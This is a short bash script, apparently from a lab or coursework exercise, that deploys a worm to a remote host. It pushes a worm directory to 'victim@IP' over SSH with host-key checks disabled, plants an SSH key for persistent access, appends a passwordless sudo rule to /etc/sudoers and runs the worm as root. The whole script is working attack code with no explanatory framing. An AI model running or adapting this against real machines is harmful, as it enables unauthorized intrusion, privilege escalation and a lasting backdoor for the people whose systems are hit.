# !/bin/bash

[ $# -ne 3 ] && echo 'You have to input the following three arguments in order: IP, username ,and password.' && exit 0

mkdir -p wormdir
mv ./l ./wormdir
mv ./f ./wormdir
mv ./c ./wormdir
mv ./worm ./wormdir

sshpass -p $2 scp -o StrictHostKeyChecking=no -r ./wormdir victim@$1:~/

if [ ! -f ~/.ssh/id_rsa ]; then
    ssh-keygen -t rsa -N "" -f id_rsa
    sshpass -p $2 ssh-copy-id -i ./id_rsa.pub victim@$1
    mv id_rsa ~/.ssh
    chmod 0600 ~/.ssh/id_rsa
fi

sshpass -p $2 ssh -o StrictHostKeyChecking=no victim@$1 /bin/bash << EOF
    echo $2 | sudo -S grep "ALL=(ALL) NOPASSWD: ALL" /etc/sudoers || echo '$2 ALL=(ALL) NOPASSWD: ALL' | sudo EDITOR='tee -a' visudo
    cd ~/wormdir
    sudo ./worm
EOF